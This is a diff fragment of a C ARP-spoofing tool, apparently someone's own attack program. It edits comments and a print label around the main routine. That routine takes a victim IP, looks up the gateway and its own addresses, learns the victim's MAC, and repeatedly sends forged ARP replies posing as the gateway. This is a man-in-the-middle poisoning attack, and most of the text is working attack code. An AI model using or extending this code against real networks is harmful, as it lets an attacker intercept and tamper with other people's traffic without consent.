@@ -280,11 +280,9 @@ int main (int argc, char * argv[]) {
 	
 	printf("Data-link Layer check completed...(type : Ethernet)\n");	
 
-	
-	inet_aton(argv[1], victim_IP);	// Save victim's IP
+	inet_aton(argv[1], victim_IP);	// Save victim's IP. In MAC OS, there was no inet_aton_r API, which is re_entrant...
 	gw_IP_Parsing(gw_IP);			// using netstat program, get IP address of gateway
 	
-
 	own_IP_Parsing(own_IP);			// using ifconfig program, get IP address of own system
 	own_MAC_Parsing(own_MACaddr);
 	Make_ARP_Packet(arp_packet, own_MACaddr, own_IP, broadcastMAC, victim_IP, ARP_REQEST); // With this Request, get vicim's MAC address...
@@ -317,7 +315,7 @@ int main (int argc, char * argv[]) {
 	printf("Sending forged ARP REPLY packet...(disguising as gateway)\n");	
 	Make_ARP_Packet (arp_packet, own_MACaddr, gw_IP, victim_MACaddr, victim_IP, ARP_REPLY);	
 
-	printf("[ ARP REPLY PACKET INFO ]\n");
+	printf("[ ARP REPLY PACKET INFO(FORGED) ]\n");
 	PrintPacket(arp_packet, sizeof(arp_packet));
 
 	while (1) {
